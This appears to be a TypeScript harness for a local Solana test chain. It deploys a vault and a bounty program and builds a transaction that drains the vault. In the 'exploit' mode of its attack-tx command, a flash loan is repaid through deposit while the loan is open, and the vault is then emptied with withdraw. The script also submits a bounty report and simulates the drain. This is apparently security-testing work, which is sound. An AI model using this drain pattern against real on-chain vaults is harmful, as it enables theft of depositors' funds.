import {
  Connection,
  Keypair,
  PublicKey,
  SYSVAR_INSTRUCTIONS_PUBKEY,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js"
import { readFileSync } from "node:fs"

const rpc = process.env.RPC ?? "http://127.0.0.1:8899"
const connection = new Connection(rpc, "confirmed")
const LAMPORTS_PER_SOL = 1_000_000_000n

const loadKey = (path: string) => Keypair.fromSecretKey(Uint8Array.from(JSON.parse(readFileSync(path, "utf8"))))

const u64 = (value: bigint) => {
  const bytes = Buffer.alloc(8)
  bytes.writeBigUInt64LE(value)
  return bytes
}

const send = async (tx: Transaction, signers: Keypair[]) => {
  const sig = await sendAndConfirmTransaction(connection, tx, signers, { commitment: "confirmed" })
  return sig
}

const keys = process.env.KEYS ?? ""
if (keys.length === 0) {
  throw new Error("KEYS is unset")
}
const payer = loadKey(`${keys}/payer.json`)
const forwarder = loadKey(`${keys}/forwarder.json`)
const attacker = loadKey(`${keys}/attacker.json`)
const vaultProgram = new PublicKey(process.env.VAULT_PROGRAM_ID ?? "")
const bountyProgram = new PublicKey(process.env.BOUNTY_PROGRAM_ID ?? "")
const [vault] = PublicKey.findProgramAddressSync([Buffer.from("vault")], vaultProgram)
const [bounty] = PublicKey.findProgramAddressSync([Buffer.from("bounty")], bountyProgram)
const threshold = 1n * LAMPORTS_PER_SOL
const bountyAmount = 10n * LAMPORTS_PER_SOL
const depositAmount = 10n * LAMPORTS_PER_SOL
// Account data length of the vault PDA. Idle lamports are the balance above its rent.
const VAULT_SPACE = 75

const positionOf = (user: PublicKey) =>
  PublicKey.findProgramAddressSync([Buffer.from("pos"), user.toBuffer()], vaultProgram)[0]

const depositIx = (user: PublicKey, amount: bigint) =>
  new TransactionInstruction({
    programId: vaultProgram,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: positionOf(user), isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([1]), u64(amount)]),
  })

const withdrawIx = (user: PublicKey) =>
  new TransactionInstruction({
    programId: vaultProgram,
    keys: [
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: positionOf(user), isSigner: false, isWritable: true },
    ],
    data: Buffer.from([3]),
  })

const flashBorrowIx = (borrower: PublicKey, amount: bigint) =>
  new TransactionInstruction({
    programId: vaultProgram,
    keys: [
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: borrower, isSigner: true, isWritable: true },
      { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([4]), u64(amount)]),
  })

const flashEndIx = () =>
  new TransactionInstruction({
    programId: vaultProgram,
    keys: [{ pubkey: vault, isSigner: false, isWritable: true }],
    data: Buffer.from([5]),
  })

const adminIx = (disc: number) =>
  new TransactionInstruction({
    programId: bountyProgram,
    keys: [
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: bounty, isSigner: false, isWritable: true },
    ],
    data: Buffer.from([disc]),
  })

const idleLamports = async () => {
  const balance = BigInt(await connection.getBalance(vault, "confirmed"))
  const rent = BigInt(await connection.getMinimumBalanceForRentExemption(VAULT_SPACE))
  return balance - rent
}

const cmd = process.argv[2]

if (cmd === "print-addresses") {
  console.log(`VAULT=${vault.toBase58()}`)
  console.log(`BOUNTY=${bounty.toBase58()}`)
  console.log(`ATTACKER=${attacker.publicKey.toBase58()}`)
  console.log(`FORWARDER=${forwarder.publicKey.toBase58()}`)
} else if (cmd === "init") {
  const initVault = new TransactionInstruction({
    programId: vaultProgram,
    keys: [
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([0]), bounty.toBuffer(), payer.publicKey.toBuffer()]),
  })
  const initBounty = new TransactionInstruction({
    programId: bountyProgram,
    keys: [
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([0]), forwarder.publicKey.toBuffer(), payer.publicKey.toBuffer()]),
  })
  await send(new Transaction().add(initVault, initBounty), [payer])
  await send(new Transaction().add(depositIx(payer.publicKey, depositAmount)), [payer])
  const register = new TransactionInstruction({
    programId: bountyProgram,
    keys: [
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([1]), u64(threshold), u64(bountyAmount)]),
  })
  await send(new Transaction().add(register), [payer])
  console.log("CHAIN_INIT_OK")
} else if (cmd === "attack-tx") {
  // honest: borrow every idle lamport and pay it back. The vault ends where it started.
  // exploit: pay it back through `deposit`, which still works while the loan is open,
  // so the repayment is also a credit that `withdraw` pays out after `flash_end`.
  const mode = process.argv[3]
  const amount = await idleLamports()
  const borrower = attacker.publicKey
  const tx = new Transaction({
    feePayer: borrower,
    recentBlockhash: (await connection.getLatestBlockhash("confirmed")).blockhash,
  })
  if (mode === "honest") {
    tx.add(
      flashBorrowIx(borrower, amount),
      SystemProgram.transfer({ fromPubkey: borrower, toPubkey: vault, lamports: amount }),
      flashEndIx(),
    )
  } else if (mode === "exploit") {
    tx.add(flashBorrowIx(borrower, amount), depositIx(borrower, amount), flashEndIx(), withdrawIx(borrower))
  } else {
    throw new Error("attack-tx takes honest or exploit")
  }
  tx.sign(attacker)
  process.stdout.write(tx.serialize().toString("base64"))
} else if (cmd === "request-cancel" || cmd === "cancel") {
  await send(new Transaction().add(adminIx(cmd === "request-cancel" ? 3 : 4)), [payer])
  console.log(`CHAIN_${cmd.toUpperCase().replace("-", "_")}_OK`)
} else if (cmd === "submit") {
  // The 96-byte report body the workflow signed: pre, post, slot, threshold, payout, vault.
  const report = Buffer.from((process.argv[3] ?? "").replace(/^0x/, ""), "hex")
  if (report.length !== 96) {
    throw new Error(`report is ${report.length} bytes, expected 96`)
  }
  const payout = new PublicKey(report.subarray(32, 64))
  const ix = new TransactionInstruction({
    programId: bountyProgram,
    keys: [
      { pubkey: forwarder.publicKey, isSigner: true, isWritable: false },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: payout, isSigner: false, isWritable: true },
      { pubkey: vaultProgram, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([2]), report]),
  })
  await send(new Transaction().add(ix), [forwarder])
  console.log("CHAIN_SUBMIT_OK")
} else if (cmd === "status") {
  const payout = new PublicKey(process.argv[3] ?? "")
  const vaultInfo = await connection.getAccountInfo(vault, "confirmed")
  const bountyInfo = await connection.getAccountInfo(bounty, "confirmed")
  const payoutInfo = await connection.getAccountInfo(payout, "confirmed")
  if (!vaultInfo || !bountyInfo || !payoutInfo) {
    throw new Error("missing account")
  }
  console.log(`VAULT_LAMPORTS=${vaultInfo.lamports}`)
  console.log(`VAULT_PAUSED=${vaultInfo.data[0]}`)
  console.log(`BOUNTY_LAMPORTS=${bountyInfo.lamports}`)
  console.log(`PAYOUT_LAMPORTS=${payoutInfo.lamports}`)
} else if (cmd === "observe") {
  const b64 = readFileSync(0, "utf8").trim()
  const before = await connection.getBalance(vault, "confirmed")
  // Legacy Transaction.simulateTransaction does not take a config object.
  // Use the same JSON-RPC shape as the workflow.
  const response = await fetch(rpc, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method: "simulateTransaction",
      params: [
        b64,
        {
          encoding: "base64",
          sigVerify: true,
          replaceRecentBlockhash: false,
          commitment: "confirmed",
          accounts: { encoding: "base64", addresses: [vault.toBase58()] },
        },
      ],
    }),
  })
  const parsed = (await response.json()) as {
    error?: { message?: string }
    result?: { value?: { err?: unknown; accounts?: Array<{ lamports?: number } | null> | null } }
  }
  if (parsed.error) {
    throw new Error(`simulate failed ${parsed.error.message ?? "unknown"}`)
  }
  if (parsed.result?.value?.err) {
    throw new Error(`simulate failed ${JSON.stringify(parsed.result.value.err)}`)
  }
  const post = parsed.result?.value?.accounts?.[0]?.lamports
  if (post === undefined || post === null) {
    throw new Error("simulate returned no vault account")
  }
  console.log(`OBSERVED pre=${before} post=${post}`)
} else {
  throw new Error(`unknown command ${cmd}`)
}
